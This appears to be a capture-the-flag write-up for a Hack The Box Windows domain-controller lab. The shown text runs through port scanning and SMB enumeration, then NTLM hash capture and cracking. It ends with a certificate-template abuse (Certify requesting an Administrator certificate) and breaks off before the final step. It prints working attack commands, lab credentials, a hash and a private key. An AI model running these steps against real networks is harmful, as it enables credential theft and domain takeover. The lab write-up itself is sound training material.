# Escape

IP: 10.10.11.202

OS: Windows

This is the write-up for Escape box from HTB.

# Reconnaissance

First, we execute a full port scan on the host.

```bash
╭─[us-free-1]-[]-[th3g3ntl3m4n@pentest]-[~/htb/machines/escape]
╰─ $ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.11.202
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49687/tcp open  unknown
49688/tcp open  unknown
49703/tcp open  unknown
49712/tcp open  unknown
52802/tcp open  unknown
```

Now, we execute a port scan on the open ports on the server.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/escape]
╰─ $ sudo nmap -vv -A -Pn -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49703,49712,52802 -oA nmap/escape 10.10.11.202
PORT      STATE SERVICE       REASON          VERSION                                                                                                                                                            
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus                                                                                                                                                    
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-05-03 05:23:42Z)                                                                                                     
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                                                              
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                                                      
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                                                      
|_ssl-date: 2023-05-03T05:25:19+00:00; +7h59m59s from scanner time.                                                                                                                                              
| ssl-cert: Subject: commonName=dc.sequel.htb                                                                                                                                                                    
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb                                                                                                                    
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel                                                                                                                                                         
| Public Key type: rsa                                                                                                                                                                                           
| Public Key bits: 2048                                                                                                                                                                                          
| Signature Algorithm: sha256WithRSAEncryption
...
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
...
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-05-03T05:25:19+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-02T14:18:01
| Not valid after:  2053-05-02T14:18:01
...
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
...
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-03T05:25:19+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
| SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
...
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-03T05:25:20+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
| SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
...
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52802/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

We can see that there is a domain on the certificates. We write it down on our /etc/hosts local file.

![Untitled](images/Untitled.png)

# Enumeration

We start enumerating the SMB port using `smbclient` tools.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/escape]
╰─ $ smbclient -L //10.10.11.202 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
```

We have a Public shared on the SMB. We connected on this.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/escape]
╰─ $ smbclient //10.10.11.202/Public -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 07:51:25 2022
  ..                                  D        0  Sat Nov 19 07:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 09:39:43 2022

                5184255 blocks of size 4096. 1457484 blocks available
```

We have a PDF file on this share. We downloaded it.

```bash
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (23.8 KiloBytes/sec) (average 23.8 KiloBytes/sec)
```

![Untitled](images/Untitled%201.png)

Open the file, we noticed that there are some instructions to access the MS SQL server from machines that are on the Active Directory domain.

![Untitled](images/Untitled%202.png)

And there are instructions for machines that aren’t on the domain.

![Untitled](images/Untitled%203.png)

For machines that aren’t in the domain, there is a valid credential.

| **USER** | **PASSWORD** |
| --- | --- |
| PublicUser | GuestUserCantWrite1 |
| sql_svc | REGGIE1234ronnie |
| Ryan.Cooper | NuclearMosquito3 |

# Exploitation

We were able to connect on MS SQL Server using the impacket tool mssqlclient.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/escape]
╰─ $ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

We can’t execute any commands or get a shell by MS SQL Server but we can run `xp_dirtree` command through MS SQLServer and capture the NTLMv2 hash from this service.

![Untitled](images/Untitled%204.png)

| USER/SERVICE | HASH |
| --- | --- |
| sequel\svc_sql | sql_svc::sequel:ea4c234ff8a5679d:8E99474E215C107D111B96A9EAF64EA9:010100000000000000F412AA1E7DD901AD5B65EC2437545700000000020008004C00310038004F0001001E00570049004E002D004A00500038005600520033005000350058004400350004003400570049004E002D004A0050003800560052003300500035005800440035002E004C00310038004F002E004C004F00430041004C00030014004C00310038004F002E004C004F00430041004C00050014004C00310038004F002E004C004F00430041004C000700080000F412AA1E7DD90106000400020000000800300030000000000000000000000000300000F7842CB45BDD1A6D7EAEB38B3A17C4B65D678CACE8644A8D93597810F07847170A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000 |
| Administrator | A52F78E4C751E5F5E17E1E9F3E58F4EE |

Using name-that-hash tool we could get the code of hash in order to use hashcat.

![Untitled](images/Untitled%205.png)

Cracking it using hashcat we got the clear text password for sql_svc.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/images/exploitation]                                                                                                                          
╰─ $ hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt                                                                                                                                               
hashcat (v6.2.6) starting                                                                                                                                                                                        
                                                                                                                                                                                                                 
OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                               
==================================================================================================================================================                                                               
* Device #1: pthread-haswell-Intel(R) Core(TM) i5-9500 CPU @ 3.00GHz, 1434/2933 MB (512 MB allocatable), 2MCU                                                                                                    
                                                                                                                                                                                                                 
Minimum password length supported by kernel: 0                                                                                                                                                                   
Maximum password length supported by kernel: 256                                                                                                                                                                 
                                                                                                                                                                                                                 
Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                                                              
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

SQL_SVC::sequel:ea4c234ff8a5679d:8e99474e215c107d111b96a9eaf64ea9:010100000000000000f412aa1e7dd901ad5b65ec2437545700000000020008004c00310038004f0001001e00570049004e002d004a00500038005600520033005000350058004400350004003400570049004e002d004a0050003800560052003300500035005800440035002e004c00310038004f002e004c004f00430041004c00030014004c00310038004f002e004c004f00430041004c00050014004c00310038004f002e004c004f00430041004c000700080000f412aa1e7dd90106000400020000000800300030000000000000000000000000300000f7842cb45bdd1a6d7eaeb38b3a17c4b65d678cace8644a8d93597810f07847170a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320035000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:ea4c234ff8a5679d:8e99474e215c107d11...000000
Time.Started.....: Tue May  2 17:59:38 2023 (18 secs)
Time.Estimated...: Tue May  2 17:59:56 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   915.5 kH/s (0.40ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10700288/14344385 (74.60%)
Rejected.........: 0/10700288 (0.00%)
Restore.Point....: 10699776/14344385 (74.59%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REJONTE -> REESY15987
Hardware.Mon.#1..: Util: 63%

Started: Tue May  2 17:58:54 2023
Stopped: Tue May  2 17:59:58 2023
```

Using the evil-winrm tool we connect on the host and get our first shell.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/images/exploitation]
╰─ $ evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
```

# Lateral Movement

Searching on the host to elevate our privileges, we checked the MS SQL Server logs and found the `ERRORLOG.BAK` file.

```bash
*Evil-WinRM* PS C:\> cd SQLServer
*Evil-WinRM* PS C:\SQLServer> dir

    Directory: C:\SQLServer

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe

*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> dir

    Directory: C:\SQLServer\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

Checking this file we noticed something different. There is an attempt to log in for the user `Ryan.Cooper` and another attempt for the strange user `NuclearMosquito3`, but the login names were defined by the pattern `name.lastname`.

![Untitled](images/Untitled%206.png)

We tried to log in using evil-winrm again but as Ryan.Cooper and the possible password were found in the error log file.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/escape]
╰─ $ evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
```

We successfully logged in as `Ryan.Cooper`. 

# Privilege Escalation (Administrator)

One of the paths to escalate privileges on a Windows system is by impersonating a certificate used by the Administrator user and getting a TGT Kerberos hash. We use the Certify tool for that.

[Ghostpack-CompiledBinaries/Certify.exe at master · r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe)

Using the upload command from `evil-winrm` tool we upload our `certify.exe` to the target.

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload /home/th3g3ntl3m4n/htb/machines/images/Certify.exe 
Info: Uploading /home/th3g3ntl3m4n/htb/machines/images/Certify.exe to C:\Users\Ryan.Cooper\Documents\Certify.exe

                                                             
Data: 232104 bytes of 232104 bytes copied

Info: Upload successful!
```

Running the tool we find the vulnerable certificate.

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable /currentuser

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using current user's unrolled group SIDs for vulnerability checks.
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
		Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years 
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519

Certify completed in 00:00:09.8500814
```

Executing the command request from the Certify tool we were able to get the private key from the certificate.

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator                                                    [48/255]
                                                                                                                                                                                                                 
   _____          _   _  __                                                                                                                                                                                      
  / ____|        | | (_)/ _|                                                                                                                                                                                     
 | |     ___ _ __| |_ _| |_ _   _                                                                                                                                                                                
 | |    / _ \ '__| __| |  _| | | |                                                                                                                                                                               
 | |___|  __/ |  | |_| | | | |_| |                                                                                                                                                                               
  \_____\___|_|   \__|_|_|  \__, |                                                                                                                                                                               
                             __/ |                                                                                                                                                                               
                            |___./                                                                                                                                                                               
  v1.0.0                                                                                                                                                                                                         
                                                                                                                                                                                                                 
[*] Action: Request a Certificates                                                                                                                                                                               
                                                                                                                                                                                                                 
[*] Current user context    : sequel\Ryan.Cooper                                                                                                                                                                 
[*] No subject name specified, using current context as subject.                                                                                                                                                 
                                                                                                                                                                                                                 
[*] Template                : UserAuthentication                                                                                                                                                                 
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb                                                                                                                                        
[*] AltName                 : sequel.htb                                                                                                                                                                         
                                                                                                                                                                                                                 
[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA                                                                                                                                                         
                                                                                                                                                                                                                 
[*] CA Response             : The certificate had been issued.                                                                                                                                                   
[*] Request ID              : 10                                                                                                                                                                                 
                                                                                                                                                                                                                 
[*] cert.pem         :                                                                                                                                                                                           
                                                                                                                                                                                                                 
-----BEGIN RSA PRIVATE KEY-----                                                                                                                                                                                  
MIIEpQIBAAKCAQEAm+Iq5fBDja7CMnNG4gr9MJhJofVBhDQUPxyFFCE/aK8rIW4o                                                                                                                                                 
/VB6TwT2LsffLgMC3PpiSsPS9B80aSRlk6znclXI9rKJ04R+OKKLxjgdqdjbTYtD                                                                                                                                                 
1UyGqSGCOmZlFbz1v8pNUcuRef/ppIGsPCmFjcQOLZ/F1v18cGnQ3KPE19wY5s1Z                                                                                                                                                 
WZHkU7lrJjHkT00uCJnnl7fRlFV3qIB4D+4gCEZ2xy7k55pJE2IMVuIz180ElxJn                                                                                                                                                 
KAIQpYZ+hhbVUjLvIgj/3L7xmzKxOIT5IiLJEltCsMPfD4LqmCtAifdetotw5Urc                                                                                                                                                 
8aIFLrwV5REPf0rUVLvuqq3xX9MVmK6KTGuAEQIDAQABAoIBAQCG7Q6glISEYF2q                                                                                                                                                 
+WjDQyvAIjCpxPV+ju1vayotMFIINIaqmwVTrZMQToUgHNSqqOSTjQ4DFNjFgTUG                                                                                                                                                 
RQC/AAwdRO97yTHPKYFvWBKP8gaK+y9nQUHnoCN2xZBJKFQaqsIzzdF7GS7EYKRF                                                                                                                                                 
RhBkyrPU73wuNXszCZnqW0zzjbVV+Mx01BL1G6sOn5oGL55ZJzWL6eFui3OKRofF                                                                                                                                                 
y8w/wOIF7R0G9feg6vqzicvrdsWM6iz6faAgbyoV7sW5YsgN708/e/ql2LYJ8MT1                                                                                                                                                 
nUmCmj0eMLa/dLxCy9vI5T6K568lnZew4eHtE4vHlxJ+8qeQyRqo6/BNQ/P4pKPj                                                                                                                                                 
nU6CdNeZAoGBAMDq8Rh9rtQKfQ/ixzNdj3R0FY15NOx1QpQrIZda9/ReTmEFak1l                                                                                                                                                 
/JT9WAnX202t3RlB1Te0Eg5r1IXqOyo+V9cSf0SGrHIj5AZKoSqvTqNvWlbyfPAF                                                                                                                                                 
vuMA22EEpEKvSHhavuI9Sfpodn4+AIVo9ewLzP+HGgY+DGgKwYWoPDrXAoGBAM7b                                                                                                                                                 
GmpRfaqivflFTgXPkj6I50BLWQPD7jUXRa+5xGvOlPDZktkFWsBggAQde0YS54s0                                                                                                                                                 
aMcDu0ATFCoyMwON/xVuO0vuV1RbDYGNlT/b2HQfn8ofCVVpUBJvzR5G3WKaxtLR                                                                                                                                                 
7yIyfdIGHefGYQwwMlvjRcZ43KJV+EN2pt5kEWdXAoGBAIyviOz0UvedQoDAP8bM                                                                                                                                                 
tx4UvdbzCk5aYRhOr+uB0osp7vzABzq0YlOAwaBEA1ENtsyBfu1lazmLF2wlWco/
tq1IdvlRQRbn55VS/V90guObBAWeRtB/UCqZaGLDEMr0quPiQYwZaAauAaOksZqY
5aajIHdEXg0pWMDS/zfqbSn3AoGBALs1/x0z7YjuSwL731ZQ+ymPm8NLrh9DRyZT
jqUwen2bdJ7aOxYgy3aKn7GZwQS1fUs2PpHHZcPiwIBD+HmCHNeXcSESb4UP9xRG
QEqQPME0EdjK6Bad/nMBLmH1fs2MCN+qUkPf8JGRKaWnnBN810bkVTUAE6b0KYFd
ND7X0Ax3AoGAB2/WDf9+bPHmrZiOZEGgBjEAJKxhCzmduBQteS5OaRNLxKIFNIqc
UvldBDDTjfzN8RwQOPyldW0NYslwtOSROLRObdlbJr2vKjyiutYIUL+0vfk4+PIu
TP2TTps3ta+SLQjUJEEjdy6lvQRM8RlUB/R+4Nl5HHZhx6LFkC/l0xs=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGDzCCBPegAwIBAgITHgAAAApKJjB75qY5RQAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNTAzMDYyMTQyWhcNMjUwNTAz
MDYzMTQyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCb4irl8EONrsIyc0biCv0wmEmh
9UGENBQ/HIUUIT9oryshbij9UHpPBPYux98uAwLc+mJKw9L0HzRpJGWTrOdyVcj2
sonThH44oovGOB2p2NtNi0PVTIapIYI6ZmUVvPW/yk1Ry5F5/+mkgaw8KYWNxA4t
n8XW/XxwadDco8TX3BjmzVlZkeRTuWsmMeRPTS4ImeeXt9GUVXeogHgP7iAIRnbH
LuTnmkkTYgxW4jPXzQSXEmcoAhClhn6GFtVSMu8iCP/cvvGbMrE4hPkiIskSW0Kw
w98PguqYK0CJ9162i3DlStzxogUuvBXlEQ9/StRUu+6qrfFf0xWYropMa4ARAgMB
AAGjggLpMIIC5TA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIL/RtmW02VhFkTr5eUlAWS4bgL3
MCUGA1UdEQQeMBygGgYKKwYBBAGCNxQCA6AMDApzZXF1ZWwuaHRiMB8GA1UdIwQY
MBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOggbCG
ga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVibGlj
JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE
Qz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAw
ga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049QUlB
LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
Z3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOC
AQEAaeqih1EE+slSbXlfs0l7sZzKpjM9mAWXGrNHKYu53L7VShuNjNY/NzxaFB1B
M9c/lyzg8pbJRzDIS8a1ZL5wz2Hyb8fLCsjaK75bI8yqO1Ly7+5CTRLHInRtCPWQ
3QqprJi+qPtO6HdEQOSe5XXSZNaRhVXVraTcDahpicRO54utIGFHAKZP5Fzlpeiy
IgcNRCbZDdSQdiifEqEdfDOf4orqKLOlNT7MnSglEyhhseXbUFqejKZ+JzL0VjBi
wAWF1RORRyT25DCplteL9H9JIkNkpiMEJP+KJ+U5G6D6Xg6LQdijfGwd7LpTi+TK
xHG2iW/LENzyKwsxghVqPO+B7A==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:12.8114214
```

Now, on the Kali machine, we saved those keys in a `.pem` file and used `openssl` to convert the `.pem` file to `.pfx` file.

```bash
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/images/exploitation/privesc]
╰─ $ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
╭─[us-free-1]-[10.10.14.25]-[th3g3ntl3m4n@pentest]-[~/htb/machines/images/exploitation/privesc]
╰─ $ ls
cert.pem  cert.pfx
```

Now we upload the Rubeus tool and the `.pfx` certificate generated for us in order to get the Administrator hash.

```bash
